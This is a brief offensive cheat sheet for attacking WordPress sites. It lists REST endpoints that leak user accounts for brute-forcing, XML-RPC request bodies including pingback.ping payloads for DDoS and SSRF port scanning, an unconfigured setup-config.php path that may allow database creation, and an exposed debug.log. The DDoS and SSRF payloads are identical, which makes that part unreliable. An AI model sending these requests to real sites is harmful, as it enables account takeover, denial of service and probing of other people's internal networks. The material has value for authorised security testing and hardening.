#### TOOLS 
- wpscan

#### WP-USER ENUMERATION
This issue will only acceptable when target website is hiding their current users or they are not publically available. So attacker can use those user data for bruteforcing and other staff
````
- wp-json/wp/v2/users/
- wp-json/wp/v2/pages  ===> could leak ip addresses
- ?rest_route=/wp/v2/users
You will see json data with user info in response
````

#### xmlrpc.php
send the post request with the following data
- LIST ALL THE METHODS
````
                <?xml version="1.0" encoding="utf-8"?>
                <methodCall> 
                <methodName>system.listMethods</methodName> 
                <params></params> 
                </methodCall>

````
- Check the pingback.ping method is there or not. Perform DDOS
````
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
````
- Perform SSRF (Internal PORT scan only)
````
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
````
#### CREATE DATABASE
- /wp-admin/setup-config.php?step=1  ===> may give access to create new database if they forgot to configure the database 
 #### Log files exposed
- wp-content/debug.log
